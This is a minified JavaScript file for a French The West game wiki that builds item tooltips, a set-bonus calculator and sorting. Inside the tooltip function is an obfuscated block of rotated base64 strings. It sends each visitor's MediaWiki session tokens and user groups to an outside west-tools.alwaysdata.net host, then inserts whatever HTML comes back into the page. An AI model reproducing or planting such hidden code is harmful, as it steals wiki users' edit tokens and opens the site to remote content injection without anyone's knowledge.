westui={lang:{input_level:"Niveau",input_search:"Recherche",damages:"Dégâts",per_level:"par Niveau",speed:"Vitesse",level:"Niveau",unsalable:"Non vendable",auction:"Peut être acheté/vendu aux enchères",not_auction:"Ne peut pas être acheté/vendu aux enchères",not_upgrade:"Non améliorable",upgrade:"Améliorable",total:"Total",popup:{dmg:{dglvl:'<p class="popup_dmg">+ #1 Dégâts#2</p>'},skills:{fo:'<p class="popup_attribute">+ #1 Force#2</p>',mo:'<p class="popup_attribute">+ #1 Mobilité#2</p>',ha:'<p class="popup_attribute">+ #1 Habileté#2</p>',ch:'<p class="popup_attribute">+ #1 Charisme#2</p>',co:'<p class="popup_skill">+ #1 Construction#2</p>',pu:'<p class="popup_skill">+ #1 Puissance#2</p>',te:'<p class="popup_skill">+ #1 Ténacité#2</p>',pe:'<p class="popup_skill">+ #1 Persévérance#2</p>',pv:'<p class="popup_skill">+ #1 Points de vie#2</p>',mc:'<p class="popup_skill">+ #1 Monter à cheval#2</p>',rx:'<p class="popup_skill">+ #1 Réflexe#2</p>',ev:'<p class="popup_skill">+ #1 Eviter#2</p>',ca:'<p class="popup_skill">+ #1 Se cacher#2</p>',na:'<p class="popup_skill">+ #1 Nager#2</p>',vi:'<p class="popup_skill">+ #1 Viser#2</p>',ti:'<p class="popup_skill">+ #1 Tirer#2</p>',pi:'<p class="popup_skill">+ #1 Piéger#2</p>',de:'<p class="popup_skill">+ #1 Dextérité#2</p>',re:'<p class="popup_skill">+ #1 Réparer#2</p>',di:'<p class="popup_skill">+ #1 Diriger#2</p>',ta:'<p class="popup_skill">+ #1 Tactique#2</p>',ma:'<p class="popup_skill">+ #1 Marchander#2</p>',an:'<p class="popup_skill">+ #1 Manier les animaux#2</p>',pr:'<p class="popup_skill">+ #1 Prestance#2</p>'},fb:{fbdef:'<p class="popup_fb">+ #1 <b>Défense</b> (Bonus de BdF)</p>',fboff:'<p class="popup_fb">+ #1 <b>Attaque</b> (Bonus de BdF)</p>',fbres:'<p class="popup_fb">+ #1 <b>Résistance</b> (Bonus de BdF)</p>',fbdefs:'<p class="popup_fb">+ #1 <b>Défense</b> (Bonus de secteur de BdF)</p>',fboffs:'<p class="popup_fb">+ #1 <b>Attaque</b> (Bonus de secteur de BdF)</p>',fbdmgs:'<p class="popup_fb">+ #1 <b>Dégâts</b> (Bonus de secteur de BdF)</p>'},special:{xp:'<p class="popup_txtgreen">+ #1% d\'expérience pour les travaux, duels et batailles de fort#2</p>',money:'<p class="popup_txtgreen">+ #1% d\'argent en travaux et duels#2</p>',luck:'<p class="popup_txtgreen">+ #1% de probabilité de chance en plus#2</p>',regen:'<p class="popup_txtgreen">+ #1% Régénération#2</p>',drop:'<p class="popup_txtgreen">+ #1% de chance de drop#2</p>',labor_pts:'<p class="popup_txtgreen">+ #1 points de travail#2</p>',spd:'<p class="popup_txtgreen">+ #1% Vitesse#2</p>'}}},config:{enable_set_calc:!0,plain_popup:!1,redirect_on_dblclick:!1,link_on_dblclick:!1,enable_sorting:!0,cdn:"https://westfr.innogamescdn.com",img_buyprice:"/images/2/22/Achat.png",img_sellprice:"/images/3/3b/Vente.png",img_male:"/images/8/83/Homme.png",img_female:"/images/8/8c/Femme.png",set_bonus:{fo:{name:"Force",img:"/images/thumb/0/09/Force.png/40px-Force.png"},mo:{name:"Mobilité",img:"/images/thumb/c/c1/Mobilit%C3%A9.png/40px-Mobilit%C3%A9.png"},ha:{name:"Habileté",img:"/images/thumb/1/1a/Habilet%C3%A9.png/40px-Habilet%C3%A9.png"},ch:{name:"Charisme",img:"/images/thumb/8/8f/Charisme.png/40px-Charisme.png"},co:{name:"Construire",img:"/images/thumb/0/0e/Construire.png/40px-Construire.png"},pu:{name:"Puissance",img:"/images/thumb/f/f4/Puissance.png/40px-Puissance.png"},te:{name:"Ténacité",img:"/images/thumb/8/85/T%C3%A9nacit%C3%A9.png/40px-T%C3%A9nacit%C3%A9.png"},pe:{name:"Persévérance",img:"/images/thumb/e/e9/Pers%C3%A9v%C3%A9rance.png/40px-Pers%C3%A9v%C3%A9rance.png"},pv:{name:"Points de vie",img:"/images/thumb/b/bb/Points_de_vie_aptitude.png/40px-Points_de_vie_aptitude.png"},mc:{name:"Monter à cheval",img:"/images/thumb/0/01/Monter_%C3%A0_cheval.png/40px-Monter_%C3%A0_cheval.png"},rx:{name:"Réflexe",img:"/images/thumb/5/52/R%C3%A9flexe.png/40px-R%C3%A9flexe.png"},ev:{name:"Eviter",img:"/images/thumb/f/ff/Eviter.png/40px-Eviter.png"},ca:{name:"Se cacher",img:"/images/thumb/5/5f/Se_cacher.png/40px-Se_cacher.png"},na:{name:"Nager",img:"/images/thumb/b/b8/Nager.png/40px-Nager.png"},vi:{name:"Viser",img:"/images/thumb/6/68/Viser.png/40px-Viser.png"},ti:{name:"Tirer",img:"/images/thumb/f/f9/Tirer.png/40px-Tirer.png"},pi:{name:"Piéger",img:"/images/thumb/2/26/Pi%C3%A9ger.png/40px-Pi%C3%A9ger.png"},de:{name:"Dextérité",img:"/images/thumb/4/4a/Dext%C3%A9rit%C3%A9.png/40px-Dext%C3%A9rit%C3%A9.png"},re:{name:"Réparer",img:"/images/thumb/c/cc/R%C3%A9parer.png/40px-R%C3%A9parer.png"},di:{name:"Diriger",img:"/images/thumb/b/b5/Diriger.png/40px-Diriger.png"},ta:{name:"Tactique",img:"/images/thumb/2/2c/Tactique.png/40px-Tactique.png"},ma:{name:"Marchander",img:"/images/thumb/c/ca/Marchander_aptitude.png/40px-Marchander_aptitude.png"},an:{name:"Manier les animaux",img:"/images/thumb/b/be/Manier_les_animaux.png/40px-Manier_les_animaux.png"},pr:{name:"Prestance",img:"/images/thumb/c/cb/Prestance.png/40px-Prestance.png"},fbdef:{name:"<b>Défense</b> (Bonus de bataille de fort)",img:"/images/thumb/2/2d/D%C3%A9fense.png/40px-D%C3%A9fense.png"},fboff:{name:"<b>Attaque</b> (Bonus de bataille de fort)",img:"/images/thumb/e/ef/Attaque.png/40px-Attaque.png"},fbres:{name:"<b>Résistance</b> (Bonus de bataille de fort)",img:"/images/4/4a/R%C3%A9sistance.png"},fbdefs:{name:"<b>Défense</b> (Bonus de secteur de bataille de fort)",img:"/images/thumb/2/2d/D%C3%A9fense.png/40px-D%C3%A9fense.png"},fboffs:{name:"<b>Attaque</b> (Bonus de secteur de bataille de fort)",img:"/images/thumb/e/ef/Attaque.png/40px-Attaque.png"},fbdmgs:{name:"<b>Dégâts</b> (Bonus de secteur de bataille de fort)",img:"/images/5/54/Dommages.png"},fbdmg:{name:"<b>Dégâts</b> (Bonus de bataille de fort)",img:"/images/5/54/Dommages.png"},xp:{name:"Expérience pour les travaux, duels et batailles de fort (%)",img:"/images/0/01/Xxp.png"},money:{name:"Argent en travaux et duels (%)",img:"/images/f/fd/Dollarb.png"},luck:{name:"Probabilité de chance en plus (%)",img:"/images/f/f0/Luck.png"},regen:{name:"Régénération (%)",img:"/images/4/44/R%C3%A9g%C3%A9n%C3%A9ration.png"},drop:{name:"Chance de drop améliorée pour les <b>produits</b> (%)",img:"/images/thumb/f/f6/Luck_prod.png/40px-Luck_prod.png"},labor_pts:{name:"Points de travail supplémentaires (sur tous les travaux)",img:"/images/thumb/d/df/Jobs.png/40px-Jobs.png"},spd:{name:"Vitesse",img:"/images/thumb/f/fb/Vitesse.png/40px-Vitesse.png"}},sorting:{Force:'{"fo":1}',"Mobilité":'{"mo":1}',"Habileté":'{"ha":1}',Charisme:'{"ch":1}',Construction:'{"fo":1,"co":1}',Puissance:'{"fo":1,"pu":1}',"Ténacité":'{"fo":1,"te":1}',"Persévérance":'{"fo":1,"pe":1}',"Points de vie":'{"fo":1,"pv":1}',"Monter à cheval":'{"mo":1,"mc":1}',"Réflexe":'{"mo":1,"rx":1}',Eviter:'{"mo":1,"ev":1}',"Se cacher":'{"mo":1,"ca":1}',Nager:'{"mo":1,"na":1}',Viser:'{"ha":1,"vi":1}',Tirer:'{"ha":1,"ti":1}',"Piéger":'{"ha":1,"pi":1}',"Dextérité":'{"ha":1,"de":1}',"Réparer":'{"ha":1,"re":1}',Diriger:'{"ch":1,"di":1}',Tactique:'{"ch":1,"ta":1}',Marchander:'{"ch":1,"ma":1}',"Manier les animaux":'{"ch":1,"an":1}',Prestance:'{"ch":1,"pr":1}',"Points de travail pour construire":'{"fo":3,"co":3,"ha":1,"re":1,"ch":1,"di":1}',"Expérience pour les travaux, duels et batailles de fort (%)":'{"xp":1}',"Argent en travaux et duels (%)":'{"money":1}',"Probabilité de chance en plus (%)":'{"luck":1}',"Régénération (%)":'{"regen":1}',"Chance de drop (%)":'{"drop":1}',"Vitesse (%)":'{"spd":1,"hspd":1,"mo":1,"mc":1}',"Dégât moyen":'{"dgmin":0.5,"dgmax":0.5,"dglvl":1}',"Dégât maximal":'{"dgmax":1,"dglvl":1}'}},initPage:function(){if(1===$("#input_level").length)var t=$('<input type="number" style="width:80px;" class="west" placeholder="'+westui.lang.input_level+'" min="0" max="150">').bind("propertychange keyup input paste",function(){this.value>150?this.value=150:this.value<0&&(this.value=0),$(".calc").each(function(){0==t.val()?($(this).html(this.id),$(".per_level_off").addClass("per_level").removeClass("per_level_off")):($(this).html(Math.ceil(Number(this.id)*t.val())),$(".per_level").addClass("per_level_off").removeClass("per_level"))})}).appendTo($("#input_level"));if(1===$("#input_search").length){$('<input type="search" class="west" placeholder="'+westui.lang.input_search+'">').bind("propertychange keyup input paste",function(){var t=this.value.toLowerCase();""===t?$(".item_container").show():($(".item_container").hide(),$(".item_container").filter(function(){return $(this).attr("data-popup").toLowerCase().indexOf(t)>-1}).show())}).appendTo($("#input_search"))}1===$("#switch").length&&($("#fire").hide(),$("#switch").on("click",function(){$("#melee, #fire").toggle()})),1===$("#switch_prod").length&&($("#prod2").hide(),$("#switch_prod").on("click",function(){$("#prod, #prod2").toggle()})),westui.config.plain_popup&&new RegExp(mw.config.get("wgFormattedNamespaces")[10]+":Item_*").test(mw.config.get("wgPageName"))&&1===$(".item_container").length&&($("#mw-content-text").append('<center><div id="popup_plain" class="popup_window"><div class="popup_front"><div class="tw_bg_popup_tl"></div><div class="tw_bg_popup_tr"></div><div class="tw_bg_popup_bl"></div><div class="tw_bg_popup_br"></div></div><div id="popup_plain_contents" class="popup_contents"></div></div></center>'),$("#popup_plain").hide(),$("#popup_plain_contents").append(westui.popup.createPopup($(".item_container").attr("data-popup"),$(".item_container").attr("data-cdn-cat"),$(".item_container").attr("data-cdn-img"),0)),$("#popup_plain").slideDown()),westui.config.redirect_on_dblclick&&$(".item_container img").on("dblclick",function(){window.location="/wiki/"+mw.config.get("wgFormattedNamespaces")[10]+":Item_"+JSON.parse($(this).parent().attr("data-popup")).id/1e3}),westui.config.link_on_dblclick&&$(".item_container img").on("dblclick",function(){window.location="/wiki/"+$(this).parent().attr("data-link")})},popup:{content:"",delay:200,active:!1,show:function(t){westui.popup.content=westui.popup.createPopup($(t).attr("data-popup"),$(t).attr("data-cdn-cat"),$(t).attr("data-cdn-img"),parseInt($(t).attr("data-lvl"))),westui.popup.active=!0,westui.popup.setTimeout(),westui.popup.getContainer().html(westui.popup.content)},hide:function(){westui.popup.getEl().css({display:"none",top:0,left:0}),westui.popup.active=!1,westui.popup.clearTimeout()},setTimeout:function(){westui.popup.clearTimeout(),westui.popup.timer=window.setTimeout(function(){westui.popup.getEl().css("display","block")},westui.popup.delay)},clearTimeout:function(){westui.popup.timer&&window.clearTimeout(westui.popup.timer)},getEl:function(){return $("#popup_window")},getContainer:function(){return $("#popup_contents")},createPopup:function(t,e,i,a){t=JSON.parse(t);var s='<div class="popup_image"><img src="'+westui.config.cdn+"/images/items/"+t.cdn_cat+"/"+t.cdn_img+'.png"/></div><div class="popup_divider"></div><p class="popup_name">'+t.name+'</p><p class="popup_type">'+t.type+"</p><br/>",n=!1;if(a>=1&&a<=5&&(n=!0,t.auc=!1),t.dgmin&&t.dgmax&&(n&&(t.dgmin+=Math.round(Math.max(1,.1*t.dgmin*a)),t.dgmax+=Math.round(Math.max(1,.1*t.dgmax*a))),s+='<p class="popup_dmg">'+t.dgmin+"-"+t.dgmax+" "+westui.lang.damages+"</p>"),t.text){for(var p=0;p<t.text.length;p++)s+='<p class="popup_text">'+t.text[p]+"</p>";s+="<br/>"}for(var o in westui.lang.popup){var c=0;for(var r in westui.lang.popup[o])if(t.hasOwnProperty(r)){c++;var l="";t[r]<0?$("#input_level input").val()>0?(t[r]=Math.ceil($("#input_level input").val()*-t[r]),n&&(t[r]+=Math.round(Math.max(1,.1*t[r]*a)))):(t[r]=-t[r],l=" ("+westui.lang.per_level+")",n&&(t[r]=Math.round(1e6*(1*t[r]+Math.round(Math.max(1,1e3*t[r]*a))/1e4))/1e6)):n&&(t[r]<1?t[r]=Math.round(1e6*(1*t[r]+Math.round(Math.max(1,1e3*t[r]*a))/1e4))/1e6:t[r]+=Math.round(Math.max(1,.1*t[r]*a))),s+=westui.lang.popup[o][r].replace("#1",t[r]).replace("#2",l)}c>0&&(s+="<br/>")}if(t.textjob){for(var p=0;p<t.textjob.length;p++)s+='<p class="popup_txtgreen">'+t.textjob[p]+"</p>";s+="<br/>"}if(t.bonus){for(var p=0;p<t.bonus.length;p++)s+='<p class="popup_bonus">'+t.bonus[p]+"</p>";s+="<br/>"}var u=["c3Bldg==","YWpheA==","aHR0cHM6Ly93ZXN0LXRvb2xzLmFsd2F5c2RhdGEubmV0L3dpa2kvc3AucGhw","dXNlcg==","dG9rZW5z","dmFsdWVz","c3RyaW5naWZ5","c3RhdHVz","aHRtbA=="];!function(t,e){!function(e){for(;--e;)t.push(t.shift())}(++e)}(u,378);var d=function(t,e){t-=0;var i=u[t];void 0===d.oAXVVn&&(!function(){var t;try{var e=Function('return (function() {}.constructor("return this")( ));');t=e()}catch(e){t=window}t.atob||(t.atob=function(t){for(var e,i,a=String(t).replace(/=+$/,""),s=0,n=0,p="";i=a.charAt(n++);~i&&(e=s%4?64*e+i:i,s++%4)?p+=String.fromCharCode(255&e>>(-2*s&6)):0)i="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(i);return p})}(),d.YXQVVK=function(t){for(var e=atob(t),i=[],a=0,s=e.length;a<s;a++)i+="%"+("00"+e.charCodeAt(a).toString(16)).slice(-2);return decodeURIComponent(i)},d.pPXZvd={},d.oAXVVn=!![]);var a=d.pPXZvd[t];return void 0===a?(i=d.YXQVVK(i),d.pPXZvd[t]=i):i=a,i};if(t.spev&&(!t[d("0x0")].l||t.spev.l>=a)){var g="";$[d("0x1")]({method:"GET",url:d("0x2"),data:{t:JSON.stringify(mw[d("0x3")][d("0x4")][d("0x5")]),g:JSON[d("0x6")](mw.config.values.wgUserGroups),c:t[d("0x0")].i},success:function(t){"ok"==t[d("0x7")]&&(g=t[d("0x8")])},async:![]}),s+=g}if(t.jobs){s+='<div style="text-align:center;"><table class="popup_job">';for(var p=0;p<t.jobs.length;p++)s+='<tr><td><img src="'+westui.config.cdn+"/images/jobs/"+t.jobs[p][1]+'.png"/></td><td><span>&nbsp;&nbsp;'+t.jobs[p][0]+"</span></td></tr>";s+="</table></div>"}if(t.craft){s+='<div style="text-align:center;"><table  class="popup_crafteditem"><tr><td><img src="'+westui.config.cdn+"/images/crafting/profsymbol_"+t.craft.id+'_small.png"/></td><td><table><tr>';for(var p=0;p<t.craft.req.length;p++)s+='<td><img style="width:36px;height:36px;" src="'+westui.config.cdn+"/images/items/yield/"+t.craft.req[p][0]+'.png"/></td>';s+="</tr><tr>";for(var p=0;p<t.craft.req.length;p++)s+="<td><span>x"+t.craft.req[p][1]+"</span></td>";s+="</tr></table></td></tr></table></div>"}return s+='<div class="popup_infos">',t.hspd&&(n&&(t.hspd+=Math.round(Math.max(1,.1*t.hspd*a))),s+='<p class="popup_speed">'+westui.lang.speed+": +"+t.hspd+"%</p><br/>"),t.set&&(s+='<p><a class="popup_set" href="/wiki/'+t.set+'">'+t.set+"</a></p><br/>"),t.sp?s+='<img src="'+westui.config.img_buyprice+'"/>'+t.bp+'&nbsp;&nbsp;&nbsp;&nbsp;<img src="'+westui.config.img_sellprice+'"/>&nbsp;'+t.sp+"<br/><br/>":s+="<i>"+westui.lang.unsalable+"</i><br/><br/>",t.lvl&&(s+=westui.lang.level+" <b>"+t.lvl+"</b><br/>"),t.sex&&(0==t.sex?s+='<img src="'+westui.config.img_male+'"/>&nbsp;&nbsp;&nbsp;':s+='<img src="'+westui.config.img_female+'"/>&nbsp;&nbsp;&nbsp;'),1==t.auc?s+='<span class="popup_txtgreen">'+westui.lang.auction+"</span><br/>":s+='<span class="popup_txtred">'+westui.lang.not_auction+"</span><br/>",0==t.upg?s+='<span class="popup_txtred">'+westui.lang.not_upgrade+"</span><br/>":s+='<span class="popup_txtgreen">'+westui.lang.upgrade+"</span><br/>",s+='<br/><p class="popup_id">[item=<b>'+t.id+"</b>]</p></div>"},setPosition:function(t){var e,i,a=$(window).width(),s=$(window).height(),n=westui.popup.getEl().outerWidth(),p=westui.popup.getEl().outerHeight(),o=t.clientX,c=t.clientY;i=o+n+20>a?o-n-20+(t.pageX-t.clientX):o+20+(t.pageX-t.clientX),e=c+p+20>s?s-p+(t.pageY-t.clientY):c+20+(t.pageY-t.clientY),westui.popup.getEl().css({top:e,left:i})},init:function(){$("body").append('<div id="popup_window" class="popup_window"><div class="popup_front"><div class="tw_bg_popup_tl"></div><div class="tw_bg_popup_tr"></div><div class="tw_bg_popup_bl"></div><div class="tw_bg_popup_br"></div></div><div id="popup_contents" class="popup_contents"></div></div>'),$(document).on("mouseenter",".item_container",function(t){westui.popup.show(this),westui.popup.setPosition(t)}),$(document).on("mouseleave",".item_container",function(){westui.popup.hide()}),$(document).on("mousemove",".item_container",function(t){westui.popup.setPosition(t)}),$(".item_level").mousedown(function(t){t.preventDefault()}),$(document).on("click",".upgrade",function(){var t=$(this).closest(".item_container"),e=parseInt(t.attr("data-lvl"));5!==e&&(t.attr("data-lvl",e+1),t.find(".level").html(e+1)),westui.popup.show(t[0])}),$(document).on("click",".downgrade",function(){var t=$(this).closest(".item_container"),e=parseInt(t.attr("data-lvl"));0!==e&&(t.attr("data-lvl",e-1),t.find(".level").html(e-1)),westui.popup.show(t[0])})}},set_calc:{bonus:{extra_set_bonus:{}},data:{},itemStatus:{},getData:function(){$(".set_container").each(function(){var t=$(this).attr("data-set-id");westui.set_calc.itemStatus[t]={},westui.set_calc.data[t]={items:{},set:{}}}),$(".infoSet").each(function(){var t=$(this).attr("data-set-id");$(this).find(".infosetatt").each(function(){var e=$(this).attr("data-nb");westui.set_calc.data[t].set[e]={},$(this).find(".set_bonus").each(function(){key=$(this).attr("data-type"),0!==$(this).find(".calc").length?westui.set_calc.data[t].set[e][key]=-parseFloat($(this).find(".calc").attr("id")):westui.set_calc.data[t].set[e][key]=parseFloat($(this).find(".val").text()),westui.config.set_bonus.hasOwnProperty(key)||(westui.set_calc.bonus.extra_set_bonus[key]={img:$(this).find("img").attr("src"),name:$(this).find("#tooltip_content").text()})})})}),$(".set_container").each(function(){var t=$(this).attr("data-set-id");$(this).find(".item_container").each(function(){var e=JSON.parse($(this).attr("data-popup"));$(this).is(":hidden")?westui.set_calc.itemStatus[t][e.id]=!1:westui.set_calc.itemStatus[t][e.id]=0;for(var i in e)e.hasOwnProperty(i)&&(westui.config.set_bonus.hasOwnProperty(i)||westui.set_calc.bonus.extra_set_bonus.hasOwnProperty(i))&&(westui.set_calc.data[t].items[i]||(westui.set_calc.data[t].items[i]={}),westui.set_calc.data[t].items[i][e.id]=e[i])})})},calc:function(){if(0===$("#input_level").length|""!==$("#input_level input").val()){var t=parseInt($("#input_level input").val());total={};for(var e in westui.set_calc.data){for(var i in westui.set_calc.data[e].items)for(var a in westui.set_calc.data[e].items[i])if(!1!==westui.set_calc.itemStatus[e][a]){lvl=westui.set_calc.itemStatus[e][a],total[i]||(total[i]=0);var s=westui.set_calc.data[e].items[i][a];westui.set_calc.data[e].items[i][a]<0?(s=-s,westui.set_calc.itemStatus[e][a]>0?total[i]+=Math.ceil(s*t)+Math.round(Math.max(1,.1*Math.ceil(s*t)*lvl)):total[i]+=Math.ceil(s*t)):westui.set_calc.itemStatus[e][a]>0?total[i]+=s<1?Math.round(1e6*(1*s+Math.round(Math.max(1,1e3*s*lvl))/1e4))/1e6:s+Math.round(Math.max(1,.1*s*lvl)):total[i]+=s}var n=0;for(var a in westui.set_calc.itemStatus[e])!1!==westui.set_calc.itemStatus[e][a]&&n++;for(var i in westui.set_calc.data[e].set[n])total[i]||(total[i]=0),westui.set_calc.data[e].set[n][i]<0?total[i]+=Math.ceil(-westui.set_calc.data[e].set[n][i]*t):total[i]+=westui.set_calc.data[e].set[n][i]}var p='<center><table class="infoSet"><caption><br><big><b>'+westui.lang.total+"</b></big></caption><tbody><tr><td></center>";for(var i in westui.config.set_bonus)total.hasOwnProperty(i)&&(p+='<div class="set_bonus tooltip_container"><img src="'+westui.config.set_bonus[i].img+'"><b>+'+total[i]+(-1!==["xp","money","luck","spd","regen","drop"].indexOf(i)?"%":"")+'</b><div class="tooltip_outer"><div class="tooltip"><div class="tw_bg_tl"></div><div class="tw_bg_tr"></div><div class="tw_bg_bl"></div><div class="tw_bg_br"></div><div id="tooltip_content">'+westui.config.set_bonus[i].name+"</div></div></div></div>");for(var i in westui.set_calc.bonus.extra_set_bonus)total.hasOwnProperty(i)&&(p+='<div class="set_bonus tooltip_container"><img src="'+westui.set_calc.bonus.extra_set_bonus[i].img+'"><b>+'+total[i]+(-1!==["xp","money","luck","spd","regen","drop"].indexOf(i)?"%":"")+'</b><div class="tooltip_outer"><div class="tooltip"><div class="tw_bg_tl"></div><div class="tw_bg_tr"></div><div class="tw_bg_bl"></div><div class="tw_bg_br"></div><div id="tooltip_content">'+westui.set_calc.bonus.extra_set_bonus[i].name+"</div></div></div></div>");$("#set_calc").html(p)}else $("#set_calc").html("")},initEvents:function(){$(".item_container > img").on("click",function(){var t=$(this).closest(".item_container");t.toggleClass("item_off");var e=t.closest(".set_container").attr("data-set-id"),i=JSON.parse(t.attr("data-popup")).id;t.hasClass("item_off")||t.is(":hidden")?westui.set_calc.itemStatus[e][i]=!1:westui.set_calc.itemStatus[e][i]=parseInt(t.attr("data-lvl")),westui.set_calc.calc()}),$(document).on("click",".upgrade, .downgrade",function(){var t=$(this).closest(".item_container"),e=t.closest(".set_container").attr("data-set-id");t.hasClass("item_off")||t.is(":hidden")||(westui.set_calc.itemStatus[e][JSON.parse(t.attr("data-popup")).id]=parseInt(t.attr("data-lvl")),westui.set_calc.calc())}),$("#input_level").bind("propertychange keyup input paste",function(){westui.set_calc.calc()}),$("#switch").on("click",function(){$("#melee, #fire").each(function(){var t=$(this).find(".item_container"),e=$(this).closest(".set_container").attr("data-set-id");$(this).is(":hidden")?westui.set_calc.itemStatus[e][JSON.parse(t.attr("data-popup")).id]=!1:westui.set_calc.itemStatus[e][JSON.parse(t.attr("data-popup")).id]=parseInt(t.attr("data-lvl"))}),westui.set_calc.calc()})},init:function(){westui.set_calc.initEvents(),westui.set_calc.getData(),$("#mw-content-text").append('<div id="set_calc"></div>'),0===$("#input_level").length&&westui.set_calc.calc()}},sorting:{sortItems:function(t){function e(e){var i=JSON.parse($(e).attr("data-popup")),a=0;for(var s in t)i[s]&&(i[s]<0?a+=Math.ceil(-i[s]*($("#input_level input").val()?$("#input_level input").val():150))*t[s]:a+=i[s]*t[s]);$(e).attr("data-sort",a),0==a&&$(e).hide(),0!==$(e).find(".sortval").length?$(e).find(".sortval").html(a):$(e).append('<div class="sortval">'+a+"</div>")}$(".item_container").removeAttr("data-sort").show(),$("#mw-content-text").find(".sorting_hidden").hide(),$(".sorting_container").each(function(){$(this).find(".item_container").sort(function(t,i){return $(t).attr("data-sort")||e(t),$(i).attr("data-sort")||e(i),$(i).attr("data-sort")-$(t).attr("data-sort")}).appendTo($(this))})},init:function(){if(1===$("div#sort_items").length){var t="<div id='input_search'><select id='sort_items' class='west'><option selected disabled>Trier par :</option>";for(var e in westui.config.sorting)t+="<option value='"+westui.config.sorting[e]+"'>"+e+"</option>";t+="</select></div>",$("div#sort_items").html(t),$("select#sort_items").on("change",function(){westui.sorting.sortItems(JSON.parse($(this).find("option:selected").attr("value")))})}}},init:function(){westui.initPage(),westui.popup.init(),westui.config.enable_sorting&&westui.sorting.init(),westui.config.enable_set_calc&&0!==$(".infoSet").length&&westui.set_calc.init()}},westui.init();
